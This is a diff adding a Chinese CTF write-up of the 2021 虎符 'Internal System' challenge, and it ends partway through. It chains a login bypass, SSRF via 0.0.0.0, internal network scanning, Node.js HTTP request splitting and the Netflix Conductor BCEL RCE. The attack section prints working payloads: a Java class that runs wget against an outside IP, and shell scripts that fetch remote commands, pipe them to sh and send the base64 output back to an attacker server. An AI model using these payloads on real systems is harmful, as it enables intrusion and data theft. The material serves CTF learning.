@@ -393,6 +393,534 @@ payload
 ?a='ricky'%0a);system('cat /flag');//
 ```
 
+## [虎符CTF 2021]Internal System
+
+### 简述
+
+```
+开发了一个公司内部的请求代理网站，好像有点问题，但来不及了还是先上线吧（─.─||）
+http://8.140.152.226:47921/
+hint: /source存在源码泄露；/proxy存在ssrf
+```
+
+### 步骤
+
+登陆端口
+
+```js
+router.get('/login', (req, res, next) => {
+  const {username, password} = req.query;
+
+  if(!username || !password || username === password || username.length === password.length || username === 'admin') {
+    res.render('login')
+  } else {
+    const hash = sha256(sha256(salt + username) + sha256(salt + password))
+
+    req.session.admin = hash === adminHash
+
+    res.redirect('/index')
+  }
+})
+```
+
+数组绕过, 用户名以数组方式传入, 当其与密码字符串再次相加时会再次变成字符串从而绕过sha1检测和字符串全等于
+
+登录之后，赵总这里给出了网络接口相关的参数，比赛环境里倒没有，需要猜, Url口会调用 /proxy, 尝试ssrf
+
+```js
+function SSRF_WAF(url) {
+  const host = new UrlParse(url).hostname.replace(/\[|\]/g, '')
+
+  return isIp(host) && IP.isPublic(host)
+}
+
+function FLAG_WAF(url) {
+  const pathname = new UrlParse(url).pathname
+  return !pathname.startsWith('/flag')
+}
+
+function OTHER_WAF(url) {
+  return true;
+}
+
+const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]
+```
+
+这几个 WAF 需要输入的 URL Host 为公网 IP，且目录不以 `/flag` 开头。
+
+这个 NodeJS 服务默认是开在 3000 端口，但是如果直接访问 `http://127.0.0.1:3000/` 会被 WAF 给拦住, 考虑用 0.0.0.0
+
+```
+/proxy?url=http://0.0.0.0:3000/
+```
+
+发现有回显, 去看 /search 口, 通过 search 带出 /flag 路由从而绕过 WAF
+
+```js
+router.all('/search', async (req, res, next) => {
+  if(!/127\.0\.0\.1/.test(req.ip)){
+    return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'})
+  }
+
+  const result = {title: 'Search Success', content: ''}
+
+  const method = req.method.toLowerCase()
+  const url = decodeURI(req.query.url)
+  const data = req.body
+
+  try {
+    if(method == 'get') {
+      const response = await axios.get(url)
+      result.content = formatResopnse(response.data)
+    } else if(method == 'post') {
+      const response = await axios.post(url, data)
+      result.content = formatResopnse(response.data)
+    } else {
+      result.title = 'Error'
+      result.content = 'Unsupported Method'
+    }
+  } catch(error) {
+    result.title = 'Error'
+    result.content = error.message
+  }
+
+  return res.json(result)
+})router.all('/search', async (req, res, next) => {
+  if(!/127\.0\.0\.1/.test(req.ip)){
+    return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'})
+  }
+
+  const result = {title: 'Search Success', content: ''}
+
+  const method = req.method.toLowerCase()
+  const url = decodeURI(req.query.url)
+  const data = req.body
+
+  try {
+    if(method == 'get') {
+      const response = await axios.get(url)
+      result.content = formatResopnse(response.data)
+    } else if(method == 'post') {
+      const response = await axios.post(url, data)
+      result.content = formatResopnse(response.data)
+    } else {
+      result.title = 'Error'
+      result.content = 'Unsupported Method'
+    }
+  } catch(error) {
+    result.title = 'Error'
+    result.content = error.message
+  }
+
+  return res.json(result)
+})
+```
+
+通过get传参url获取参数, 而且不让 127.0.0.1 访问, 还是用 0.0.0.0 去请求 /flag 路由
+
+```
+/proxy?url=http://0.0.0.0:3000/search?url=http://0.0.0.0:3000/flag
+```
+
+提示在内网中有一个 netflix conductor server 
+
+```
+someone else also deploy a netflix conductor server in Intranet?
+```
+
+> https://github.com/Netflix/conductor
+>
+> https://netflix.github.io/conductor/
+>
+> Conductor is an *orchestration* engine that runs in the cloud.
+
+它默认是开在 8080 端口，于是在内网中扫一扫
+
+```
+/proxy?url=http://0.0.0.0:3000/search?url=http://10.128.0.*:8080/
+/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.140.*:8080/
+```
+
+扫到返回大量信息的ip
+
+```
+/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.140.9:8080/
+```
+
+这是一个 Swagger UI，也就是个 API 接口文档
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Swagger UI</title>
+  <link rel="icon" type="image/png" href="images/favicon-32x32.png" sizes="32x32" />
+  <link rel="icon" type="image/png" href="images/favicon-16x16.png" sizes="16x16" />
+  <link href='css/typography.css' media='screen' rel='stylesheet' type='text/css'/>
+  <link href='css/reset.css' media='screen' rel='stylesheet' type='text/css'/>
+  <link href='css/screen.css' media='screen' rel='stylesheet' type='text/css'/>
+  <link href='css/reset.css' media='print' rel='stylesheet' type='text/css'/>
+  <link href='css/print.css' media='print' rel='stylesheet' type='text/css'/>
+
+  <script src='lib/object-assign-pollyfill.js' type='text/javascript'></script>
+  <script src='lib/jquery-1.8.0.min.js' type='text/javascript'></script>
+  <script src='lib/jquery.slideto.min.js' type='text/javascript'></script>
+  <script src='lib/jquery.wiggle.min.js' type='text/javascript'></script>
+  <script src='lib/jquery.ba-bbq.min.js' type='text/javascript'></script>
+  <script src='lib/handlebars-4.0.5.js' type='text/javascript'></script>
+  <script src='lib/lodash.min.js' type='text/javascript'></script>
+  <script src='lib/backbone-min.js' type='text/javascript'></script>
+  <script src='swagger-ui.js' type='text/javascript'></script>
+  <script src='lib/highlight.9.1.0.pack.js' type='text/javascript'></script>
+  <script src='lib/highlight.9.1.0.pack_extended.js' type='text/javascript'></script>
+  <script src='lib/jsoneditor.min.js' type='text/javascript'></script>
+  <script src='lib/marked.js' type='text/javascript'></script>
+  <script src='lib/swagger-oauth.js' type='text/javascript'></script>
+
+  <!-- Some basic translations -->
+  <!-- <script src='lang/translator.js' type='text/javascript'></script> -->
+  <!-- <script src='lang/ru.js' type='text/javascript'></script> -->
+  <!-- <script src='lang/en.js' type='text/javascript'></script> -->
+
+  <script type="text/javascript">
+      $(function () {
+
+          var url = window.location.search.match(/url=([^&]+)/); //http://127.0.0.1:8080/?url=127.0.0.1:8080
+          if (url && url.length > 1) {
+              url = decodeURIComponent(url[1]);
+
+              if (!url.includes('://')) {
+                  url = `http://${url}`;
+              }
+          } else {
+              url = window.location.origin;
+          }
+
+          hljs.configure({
+              highlightSizeThreshold: 5000
+          });
+
+          // Pre load translate...
+          if(window.SwaggerTranslator) {
+              window.SwaggerTranslator.translate();
+          }
+          window.swaggerUi = new SwaggerUi({
+              url: url + "/api/swagger.json",
+              dom_id: "swagger-ui-container",
+              supportedSubmitMethods: ['get', 'post', 'put', 'delete', 'patch'],
+              onComplete: function(swaggerApi, swaggerUi){
+                  window.swaggerUi.api.setBasePath("/api");
+                  if(typeof initOAuth == "function") {
+                      initOAuth({
+                          clientId: "your-client-id",
+                          clientSecret: "your-client-secret-if-required",
+                          realm: "your-realms",
+                          appName: "your-app-name",
+                          scopeSeparator: " ",
+                          additionalQueryStringParams: {}
+                      });
+                  }
+
+                  if(window.SwaggerTranslator) {
+                      window.SwaggerTranslator.translate();
+                  }
+              },
+              onFailure: function(data) {
+                  log("Unable to Load SwaggerUI");
+              },
+              docExpansion: "none",
+              jsonEditor: false,
+              defaultModelRendering: 'schema',
+              showRequestHeaders: false
+          });
+
+          window.swaggerUi.load();
+
+          function log() {
+              if ('console' in window) {
+                  console.log.apply(console, arguments);
+              }
+          }
+      });
+
+  </script>
+</head>
+
+<body class="swagger-section">
+<div id='header'>
+  <div class="swagger-ui-wrap">
+    <a id="logo" href="http://swagger.io"><img class="logo__img" alt="swagger" height="30" width="30" src="images/logo_small.png" /><span class="logo__title">swagger</span></a>
+    <form id='api_selector'>
+      <div class='input'><input placeholder="http://example.com/api" id="input_baseUrl" name="baseUrl" type="text"/></div>
+      <div id='auth_container'></div>
+      <div class='input'><a id="explore" class="header__btn" href="#" data-sw-translate>Explore</a></div>
+    </form>
+  </div>
+</div>
+
+<div id="message-bar" class="swagger-ui-wrap" data-sw-translate>&nbsp;</div>
+<div id="swagger-ui-container" class="swagger-ui-wrap"></div>
+</body>
+</html>
+```
+
+根据 swagger.json 拿到接口列表
+
+```
+/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080/api/swagger.json
+```
+
+先从配置下手
+
+```
+/proxy?url=http://0.0.0.0:3000/search?url=http://10.0.122.14:8080/api/admin/config
+{ 
+"jetty.git.hash": "b1e6b55512e008f7fbdf1cbea4ff8a6446d1073b",
+"loadSample": "true", 
+"io.netty.noUnsafe": "true", 
+"conductor.jetty.server.enabled": "true",
+"io.netty.noKeySetOptimization": "true", 
+"buildDate": "2021-04-03_17:38:09", "io.netty.recycler.maxCapacityPerThread": "0", 
+"conductor.grpc.server.enabled": "false", 
+"version": "2.26.0-SNAPSHOT", 
+"queues.dynomite.nonQuorum.port": "22122", 
+"workflow.elasticsearch.url": "es:9300", 
+"workflow.namespace.queue.prefix": "conductor_queues", 
+"user.timezone": "GMT", 
+"workflow.dynomite.cluster.name": "dyno1", 
+"sun.nio.ch.bugLevel": "", 
+"workflow.dynomite.cluster.hosts": "dyno1:8102:us-east-1c",
+"workflow.elasticsearch.instanceType": "external", 
+"db": "dynomite", 
+"queues.dynomite.threads": "10", 
+"workflow.namespace.prefix": "conductor",
+"workflow.elasticsearch.index.name": "conductor" 
+}
+```
+
+版本为 `2.26.0-SNAPSHOT` 
+
+### Netflix Conductor RCE
+
+参考 [CVE-2020-9296-Netflix-Conductor-RCE-漏洞分析](https://xz.aliyun.com/t/7889#toc-4)
+
+> 这个漏洞出在 `/api/metadata/taskdefs` 上，需要 POST 一个 JSON 过去，里面含有恶意的 BCEL 编码，可以造成 RCE。 
+
+什么是 BCEL编码
+
+> [http://commons.apache.org/proper/commons-bcel/](https://commons.apache.org/proper/commons-bcel/)
+>
+> The Byte Code Engineering Library (Apache Commons BCEL™) is intended to give users a convenient way to analyze, create, and manipulate (binary) Java class files (those ending with .class). Classes are represented by objects which contain all the symbolic information of the given class: methods, fields and byte code instructions, in particular.
+>
+> Byte Code Engineering Library (BCEL)，这是Apache Software Foundation 的Jakarta 项目的一部分。BCEL是 Java classworking 最广泛使用的一种框架,它可以让您深入 JVM 汇编语言进行类操作的细节。
+
+可以用 [BCELCodeman](https://github.com/f1tz/BCELCodeman) 这个工具来编码、解码。 
+
+### NodeJS 8 HTTP 请求走私
+
+暂且先不看这个，咱先看看 **怎么从 GET 接口打 POST 请求**。
+
+NodeJS 有个 [CVE-2018-12116](https://www.cvedetails.com/cve/CVE-2018-12116/)，可以在 `path` 里构造带有 Unicode 的数据，发送非预期的路径给服务端来生成另一个 HTTP 请求。
+
+或者可以说是 **HTTP 请求走私**（HTTP request smuggling）。
+
+> Node.js: All versions prior to Node.js 6.15.0 and 8.14.0: HTTP request splitting: If Node.js can be convinced to use unsanitized user-provided Unicode data for the `path` option of an HTTP request, then data can be provided which will trigger a second, unexpected, and user-defined HTTP request to made to the same server.
+
+[影响范围](https://hub.docker.com/_/node?tab=description&page=1&ordering=last_updated&name=8.13)
+
+启用docker
+
+```
+docker pull node:8.13.0-alpine
+docker run -itd --name node8.13-test node:8.13.0-alpine
+docker exec -it node8.13-test /bin/sh
+# 进入docker里执行
+npm i axios
+node
+```
+
+Node内执行
+
+```
+const axios = require('axios') 
+var s = 'http://xxx.xxx.xxx.xxx:xxxx/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private' 
+axios.get(s).then((r) => console.log(r.data)).catch(console.error)
+```
+
+夹带post请求也是
+
+```
+const axios = require('axios') 
+var s = 'http://xxx.xxx.xxx.xxx:xxxx/\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}POST\u{0120}/search?url=http://10.0.66.14:8080/api/metadata/taskdefs\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}Content-Type:application/json\u{010D}\u{010A}Content-Length:15\u{010D}\u{010A}\u{010D}\u{010A}NodeTest\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private'
+axios.get(s).then((r) => console.log(r.data)).catch(console.error)
+```
+
+### 通过 SSRF 打Conductor RCE
+
+参考文献: 
+
+1. https://www.zhaoj.in/read-6905.html
+
+2. https://miaotony.xyz/2021/04/05/CTF_2021HFCTF_internal_system/
+
+了解后发现反弹shell不行就尝试通过 wget 或者 curl 外带数据
+
+Evil.java
+
+```java
+public class Evil
+{
+    public Evil() {
+        try {
+            Runtime.getRuntime().exec("wget http://81.70.101.91:10001 -O /tmp/ricky");
+        }
+        catch (Exception ex) {
+            ex.printStackTrace();
+        }
+    }
+
+    public static void main(final String[] array) {
+    }
+}
+```
+
+编译
+
+```
+java -jar BCELCodeman.jar e Evil.java
+$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$oA$U$3d$d5$m$N$3d$8d$80$K3$f8$g$d4$850$P$ba$3b$99dF4n$8c$ae$f0$R$n$e3$c2$8dM$5b$c1Bh$3aM$81$ce$X$cd$da$Nc$5c$f8$B$7e$d4$e8$ad$8e$R$T$ad$a4N$d5$3d$f7$d4$b9$b7$aa$k$fe$df$dd$D$f8$815$DI$cc$Z$c8$a3$90$c4G$b5$7e$d2Q40$85y$j$L$3a$W$Z$S$5b$c2$Xr$9b$nV$ae$fcf$88$ef$f4$cf9C$a6$$$7c$7e0$ec$b5x$d8t$5b$5db$d2$N$e9z$97$fbn$Q$c5$d1$e9$o$c9$7b$ae$f0$Z$K$e5$d3z$c7$j$b9V$d7$f5$dbVC$86$c2oo$w$3b$a3$d1$l$86$k$df$T$ca$o$b5$3b$S$dd$aa$d2$99H$c1$d0$b1db$Z$9f$Z$be$5d$b5$b9$y$5dH$Z$d4$y$eb$97S$fdiW$j$db$a9n85$c7$b6m$a7$f4$fd$b0d$c9$5e$60$85$c2$bb$fcc$a2$84$V$86$d9I$bd$ddk$8f$HR$f4$7d$T$ab0$a8$vU$87$n$3bQ$i$b6$3a$dc$93$M$b9$Ju$3c$f4$a5$e8QW$G$d5$7e$J$f2$e5J$fd$8df$93$y$f95$f7$Y$d6$cb$ef$5c$f3$Vu$U$f6$3d$3e$Y$d0$81L$40I$Z$bdY3t$3d$8e$V$e8$f4$Xjh$60$ea$fa$84$l$u$3a$a3X$a3$b5$f0$e5$l$d8$z$b4$99$d8$Y$f1$93$bfH$d6$bf$8e$91$b8$nU$iid$e9$cb4$98$a4$9bG$820F$ec$U$f1$v$ca$e8$c8$91s$9e$i$d3$94$c9B$7b$q$60$3a$a6$Vd$e2$91$s$f7$5c$adH$93$a9y$Tm$94a$o$o$d2$843Qs$b3O$G$mj$o$3e$C$A$A
+```
+
+组合
+
+```
+[{"name":"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$oA$U$3d$d5$m$N$3d$8d$80$K3$f8$g$d4$850$P$ba$3b$99dF4n$8c$ae$f0$R$n$e3$c2$8dM$5b$c1Bh$3aM$81$ce$X$cd$da$Nc$5c$f8$B$7e$d4$e8$ad$8e$R$T$ad$a4N$d5$3d$f7$d4$b9$b7$aa$k$fe$df$dd$D$f8$815$DI$cc$Z$c8$a3$90$c4G$b5$7e$d2Q40$85y$j$L$3a$W$Z$S$5b$c2$Xr$9b$nV$ae$fcf$88$ef$f4$cf9C$a6$$$7c$7e0$ec$b5x$d8t$5b$5db$d2$N$e9z$97$fbn$Q$c5$d1$e9$o$c9$7b$ae$f0$Z$K$e5$d3z$c7$j$b9V$d7$f5$dbVC$86$c2oo$w$3b$a3$d1$l$86$k$df$T$ca$o$b5$3b$S$dd$aa$d2$99H$c1$d0$b1db$Z$9f$Z$be$5d$b5$b9$y$5dH$Z$d4$y$eb$97S$fdiW$j$db$a9n85$c7$b6m$a7$f4$fd$b0d$c9$5e$60$85$c2$bb$fcc$a2$84$V$86$d9I$bd$ddk$8f$HR$f4$7d$T$ab0$a8$vU$87$n$3bQ$i$b6$3a$dc$93$M$b9$Ju$3c$f4$a5$e8QW$G$d5$7e$J$f2$e5J$fd$8df$93$y$f95$f7$Y$d6$cb$ef$5c$f3$Vu$U$f6$3d$3e$Y$d0$81L$40I$Z$bdY3t$3d$8e$V$e8$f4$Xjh$60$ea$fa$84$l$u$3a$a3X$a3$b5$f0$e5$l$d8$z$b4$99$d8$Y$f1$93$bfH$d6$bf$8e$91$b8$nU$iid$e9$cb4$98$a4$9bG$820F$ec$U$f1$v$ca$e8$c8$91s$9e$i$d3$94$c9B$7b$q$60$3a$a6$Vd$e2$91$s$f7$5c$adH$93$a9y$Tm$94a$o$o$d2$843Qs$b3O$G$mj$o$3e$C$A$A').newInstance().class}","ownerEmail":"test@example.org","retryCount":"3","timeoutSeconds":"1200","inputKeys":["sourceRequestId","qcElementType"],"outputKeys":["state","skipped","result"],"timeoutPolicy":"TIME_OUT_WF","retryLogic":"FIXED","retryDelaySeconds":"600","responseTimeoutSeconds":"3600","concurrentExecLimit":"100","rateLimitFrequencyInSeconds":"60","rateLimitPerFrequency":"50","isolationgroupId":"myIsolationGroupId"}]
+```
+
+构造
+
+```
+POST /api/metadata/taskdefs? HTTP/1.1 
+Host: 10.0.64.14:8080 
+Content-Type: application/json 
+Content-Length:1408 
+
+[{"name":"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$oA$U$3d$d5$m$N$3d$8d$80$K3$f8$g$d4$850$P$ba$3b$99dF4n$8c$ae$f0$R$n$e3$c2$8dM$5b$c1Bh$3aM$81$ce$X$cd$da$Nc$5c$f8$B$7e$d4$e8$ad$8e$R$T$ad$a4N$d5$3d$f7$d4$b9$b7$aa$k$fe$df$dd$D$f8$815$DI$cc$Z$c8$a3$90$c4G$b5$7e$d2Q40$85y$j$L$3a$W$Z$S$5b$c2$Xr$9b$nV$ae$fcf$88$ef$f4$cf9C$a6$$$7c$7e0$ec$b5x$d8t$5b$5db$d2$N$e9z$97$fbn$Q$c5$d1$e9$o$c9$7b$ae$f0$Z$K$e5$d3z$c7$j$b9V$d7$f5$dbVC$86$c2oo$w$3b$a3$d1$l$86$k$df$T$ca$o$b5$3b$S$dd$aa$d2$99H$c1$d0$b1db$Z$9f$Z$be$5d$b5$b9$y$5dH$Z$d4$y$eb$97S$fdiW$j$db$a9n85$c7$b6m$a7$f4$fd$b0d$c9$5e$60$85$c2$bb$fcc$a2$84$V$86$d9I$bd$ddk$8f$HR$f4$7d$T$ab0$a8$vU$87$n$3bQ$i$b6$3a$dc$93$M$b9$Ju$3c$f4$a5$e8QW$G$d5$7e$J$f2$e5J$fd$8df$93$y$f95$f7$Y$d6$cb$ef$5c$f3$Vu$U$f6$3d$3e$Y$d0$81L$40I$Z$bdY3t$3d$8e$V$e8$f4$Xjh$60$ea$fa$84$l$u$3a$a3X$a3$b5$f0$e5$l$d8$z$b4$99$d8$Y$f1$93$bfH$d6$bf$8e$91$b8$nU$iid$e9$cb4$98$a4$9bG$820F$ec$U$f1$v$ca$e8$c8$91s$9e$i$d3$94$c9B$7b$q$60$3a$a6$Vd$e2$91$s$f7$5c$adH$93$a9y$Tm$94a$o$o$d2$843Qs$b3O$G$mj$o$3e$C$A$A').newInstance().class}","ownerEmail":"test@example.org","retryCount":"3","timeoutSeconds":"1200","inputKeys":["sourceRequestId","qcElementType"],"outputKeys":["state","skipped","result"],"timeoutPolicy":"TIME_OUT_WF","retryLogic":"FIXED","retryDelaySeconds":"600","responseTimeoutSeconds":"3600","concurrentExecLimit":"100","rateLimitFrequencyInSeconds":"60","rateLimitPerFrequency":"50","isolationgroupId":"myIsolationGroupId"}]
+```
+
+URL编码
+
+```
+post_payload = '[\u{017b}\u{0122}name\u{0122}:\u{0122}$\u{017b}\u{0127}1\u{0127}.getClass().forName(\u{0127}com.sun.org.apache.bcel.internal.util.ClassLoader\u{0127}).newInstance().loadClass(\u{0127}$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$oA$U$3d$d5$m$N$3d$8d$80$K3$f8$g$d4$850$P$ba$3b$99dF4n$8c$ae$f0$R$n$e3$c2$8dM$5b$c1Bh$3aM$81$ce$X$cd$da$Nc$5c$f8$B$7e$d4$e8$ad$8e$R$T$ad$a4N$d5$3d$f7$d4$b9$b7$aa$k$fe$df$dd$D$f8$815$DI$cc$Z$c8$a3$90$c4G$b5$7e$d2Q40$85y$j$L$3a$W$Z$S$5b$c2$Xr$9b$nV$ae$fcf$88$ef$f4$cf9C$a6$$$7c$7e0$ec$b5x$d8t$5b$5db$d2$N$e9z$97$fbn$Q$c5$d1$e9$o$c9$7b$ae$f0$Z$K$e5$d3z$c7$j$b9V$d7$f5$dbVC$86$c2oo$w$3b$a3$d1$l$86$k$df$T$ca$o$b5$3b$S$dd$aa$d2$99H$c1$d0$b1db$Z$9f$Z$be$5d$b5$b9$y$5dH$Z$d4$y$eb$97S$fdiW$j$db$a9n85$c7$b6m$a7$f4$fd$b0d$c9$5e$60$85$c2$bb$fcc$a2$84$V$86$d9I$bd$ddk$8f$HR$f4$7d$T$ab0$a8$vU$87$n$3bQ$i$b6$3a$dc$93$M$b9$Ju$3c$f4$a5$e8QW$G$d5$7e$J$f2$e5J$fd$8df$93$y$f95$f7$Y$d6$cb$ef$5c$f3$Vu$U$f6$3d$3e$Y$d0$81L$40I$Z$bdY3t$3d$8e$V$e8$f4$Xjh$60$ea$fa$84$l$u$3a$a3X$a3$b5$f0$e5$l$d8$z$b4$99$d8$Y$f1$93$bfH$d6$bf$8e$91$b8$nU$iid$e9$cb4$98$a4$9bG$820F$ec$U$f1$v$ca$e8$c8$91s$9e$i$d3$94$c9B$7b$q$60$3a$a6$Vd$e2$91$s$f7$5c$adH$93$a9y$Tm$94a$o$o$d2$843Qs$b3O$G$mj$o$3e$C$A$A\u{0127}).newInstance().class\u{017d}\u{0122},\u{0122}ownerEmail\u{0122}:\u{0122}test@example.org\u{0122},\u{0122}retryCount\u{0122}:\u{0122}3\u{0122},\u{0122}timeoutSeconds\u{0122}:\u{0122}1200\u{0122},\u{0122}inputKeys\u{0122}:[\u{0122}sourceRequestId\u{0122},\u{0122}qcElementType\u{0122}],\u{0122}outputKeys\u{0122}:[\u{0122}state\u{0122},\u{0122}skipped\u{0122},\u{0122}result\u{0122}],\u{0122}timeoutPolicy\u{0122}:\u{0122}TIME_OUT_WF\u{0122},\u{0122}retryLogic\u{0122}:\u{0122}FIXED\u{0122},\u{0122}retryDelaySeconds\u{0122}:\u{0122}600\u{0122},\u{0122}responseTimeoutSeconds\u{0122}:\u{0122}3600\u{0122},\u{0122}concurrentExecLimit\u{0122}:\u{0122}100\u{0122},\u{0122}rateLimitFrequencyInSeconds\u{0122}:\u{0122}60\u{0122},\u{0122}rateLimitPerFrequency\u{0122}:\u{0122}50\u{0122},\u{0122}isolationgroupId\u{0122}:\u{0122}myIsolationGroupId\u{0122}\u{017d}]'
+console.log(encodeURI(encodeURI(encodeURI('http://0.0.0.0:3000/\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}POST\u{0120}/search?url=http://10.0.140.9:8080/api/metadata/taskdefs\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}Content-Type:application/json\u{010D}\u{010A}Content-Length:' + post_payload.length + '\u{010D}\u{010A}\u{010D}\u{010A}' + post_payload+ '\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private'))))
+```
+
+得到
+
+```
+http://0.0.0.0:3000/%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0/search?url=http://10.0.122.14:8080/api/metadata/taskdefs%2525C4%2525A0HTTP/1.1%2525C4%25258D%2525C4%25258AHost:127.0.0.1:3000%2525C4%25258D%2525C4%25258AContent-Type:application/json%2525C4%25258D%2525C4%25258AContent-Length:1507%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%25255B%2525C5%2525BB%2525C4%2525A2name%2525C4%2525A2:%2525C4%2525A2$%2525C5%2525BB%2525C4%2525A71%2525C4%2525A7.getClass().forName(%2525C4%2525A7com.sun.org.apache.bcel.internal.util.ClassLoader%2525C4%2525A7).newInstance().loadClass(%2525C4%2525A7$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2$40$U$3dS$K$85Z$ET$f0$ad$b8$S_$b4$5d$f9$8c$h$a3$x$7cD$8c$$$dcX$ea$EG$a14uP$fc$o$d7l$d4$b8$f0$D$fc$u$f5$O1b$a2$93$cc$99$b9$e7$9e9$f7$ce$cc$fb$c7$eb$h$80U$cc$99Hb$c8$c40F$92$c8$ab$b5$60$60$d4D$ic$G$c6$NL0$q$b6D$m$e46C$ac$b4p$ca$a0$ef$b4$$9C$a6$o$C$7e$d0n$d6xt$e2$d5$g$c4$a4$ab$d2$f3o$f6$bd$f0$3b$d6$9b$9e$I$Y$K$a5$f3$ca$b5w$e7$d9$N$_$a8$dbU$Z$89$a0$be$a9$8c$ccj$ab$j$f9$7cO$uqj$f7N4$caJg$n$F$d3$c0$a4$85$vL3$y$df$d7$b9$y$5eI$Zn$d8$f6$9a$5b$5eu$ca$ae$e3$96$d7$dd$N$d7q$i$b7$b8rX$b4e3$b4$p$e1$df$3cX$98$c1$y$c3p$bf$den$c7$e7$a1$U$ad$c0B$R$s5$a5$ea0d$fb$8a$c3$da5$f7$rC$aeO$j$b7$D$v$9a$d4$95I$b5$7f$82$7ci$a1$f2G$b3I$96$bc$c3$7d$86$f9$d2$3f$d7$fcE$jE$z$9f$df$de$d2$81LHI$d9$7b$ad$93$c8$f39$e6$60$d0$_$a8$a1$81$a9$eb$T$OPtA$b1Fka$f1$Z$ec$F$daP$ec$J$fa$d9$p$92$95$a5$t$q$ba$a4$d2$91F$96$3eK$83E$ba$J$q$Ic$c4$c6$89OQ$c6$40$8e$9c$f3$e4$98$a6L$W$da$t$B3$88$t$88$eb$a4$ZD$e6$bb$da8M$a6f$b7$b7Q$86$89$k$91$s$cc$f6$9a$cb$7d$B$T$c2pg8$C$A$A%2525C4%2525A7).newInstance().class%2525C5%2525BD%2525C4%2525A2,%2525C4%2525A2ownerEmail%2525C4%2525A2:%2525C4%2525A2test@example.org%2525C4%2525A2,%2525C4%2525A2retryCount%2525C4%2525A2:%2525C4%2525A23%2525C4%2525A2,%2525C4%2525A2timeoutSeconds%2525C4%2525A2:%2525C4%2525A21200%2525C4%2525A2,%2525C4%2525A2inputKeys%2525C4%2525A2:%25255B%2525C4%2525A2sourceRequestId%2525C4%2525A2,%2525C4%2525A2qcElementType%2525C4%2525A2%25255D,%2525C4%2525A2outputKeys%2525C4%2525A2:%25255B%2525C4%2525A2state%2525C4%2525A2,%2525C4%2525A2skipped%2525C4%2525A2,%2525C4%2525A2result%2525C4%2525A2%25255D,%2525C4%2525A2timeoutPolicy%2525C4%2525A2:%2525C4%2525A2TIME_OUT_WF%2525C4%2525A2,%2525C4%2525A2retryLogic%2525C4%2525A2:%2525C4%2525A2FIXED%2525C4%2525A2,%2525C4%2525A2retryDelaySeconds%2525C4%2525A2:%2525C4%2525A2600%2525C4%2525A2,%2525C4%2525A2responseTimeoutSeconds%2525C4%2525A2:%2525C4%2525A23600%2525C4%2525A2,%2525C4%2525A2concurrentExecLimit%2525C4%2525A2:%2525C4%2525A2100%2525C4%2525A2,%2525C4%2525A2rateLimitFrequencyInSeconds%2525C4%2525A2:%2525C4%2525A260%2525C4%2525A2,%2525C4%2525A2rateLimitPerFrequency%2525C4%2525A2:%2525C4%2525A250%2525C4%2525A2,%2525C4%2525A2isolationgroupId%2525C4%2525A2:%2525C4%2525A2myIsolationGroupId%2525C4%2525A2%2525C5%2525BD%25255D%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258AGET%2525C4%2525A0/private
+```
+
+启服务
+
+```python
+import os
+from flask import Flask,redirect
+from flask import request
+
+
+app = Flask(__name__)
+
+@app.route('/')
+def hello():
+    return open("test1.txt").read()
+
+@app.route('/command')
+def hello1():
+    return open("command1.txt").read()
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 10001))
+    app.run(host='0.0.0.0', port=port)
+```
+
+test1.txt写sh脚本
+
+```
+#!/bin/sh
+wget -O- -q  http://81.70.101.91:10001/`wget -O- -q http://81.70.101.91:10001/command|sh|base64|awk '{printf("%s",$0)}'` | echo
+
+#!/bin/sh
+wget http://81.70.101.91:10001/1?a=`wget -O- http://81.70.101.91:10001/command|sh|base64`
+```
+
+command1.txt写执行命令
+
+```
+cat /flag
+```
+
+下载脚本后执行脚本的class
+
+```
+public class Evil
+{
+    public Evil() {
+        try {
+            Runtime.getRuntime().exec("sh /tmp/ricky");
+        }
+        catch (Exception ex) {
+            ex.printStackTrace();
+        }
+    }
+
+    public static void main(final String[] array) {
+    }
+}
+```
+
+编译
+
+```
+javac Evil.java
+java -jar BCELCodeman.jar e Evil.class
